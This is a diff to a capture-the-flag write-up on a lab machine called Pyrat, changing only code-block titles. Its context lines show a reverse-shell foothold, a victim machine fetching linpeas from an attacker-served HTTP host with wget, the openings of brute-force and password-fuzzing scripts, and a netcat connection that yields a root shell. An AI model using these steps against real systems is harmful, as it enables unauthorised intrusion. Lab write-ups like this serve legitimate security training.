@@ -93,7 +93,7 @@ We've established a stable reverse shell and gained an initial foothold on the m
 
 After spending some time searching manually, I decided to run linpeas. First, we transfer it to the victim machine.
 
-```bash title="Attacker"
+```bash
 ┌──(root㉿kali)-[~]
 └─# wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 --2024-11-12 19:53:11--  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
@@ -113,7 +113,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.43.86 - - [12/Nov/2024 19:53:52] "GET /linpeas.sh HTTP/1.1" 200 -
 ```
 
-```bash title="Victim"
+```bash
 www-data@Pyrat:~$ cd /tmp
 cd /tmp
 www-data@Pyrat:/tmp$ wget http://10.10.143.15:8000/linpeas.sh
@@ -265,7 +265,7 @@ print(1+1)
 Now things get a bit trickier... we need to try guessing the endpoint.
 After observing that sending unkown data to the endpoint gives `X is not defined` or empty response we'll code and use the following Python script to brute-force and find something different returned on the response.
 
-```python title="find_endpoint.py"
+```python
 #!/usr/bin/env python3
 
 import socket
@@ -337,7 +337,7 @@ Password:
 Therefore, we need to adjust the previous Python script and attempt to fuzz for valid password(and hope) that it works.
 After some trial and error, I noticed that after every three attempts, we need to send the admin endpoint again to continue without creating a new socket each time. I incorporated this into the script accordingly
 
-```python title="find_endpoint.py"
+```python
 #!/usr/bin/env python3
 
 import socket
@@ -413,7 +413,7 @@ It appears that a successful password attempt triggers a Welcome admin message o
 
 Manually inputting the admin endpoint with the discovered password grants us a root shell, allowing us to retrieve the flag
 
-````bash
+```bash
 ┌──(root㉿kali)-[~/Desktop]
 └─# nc 10.10.43.86 8000                                                                                        
 admin
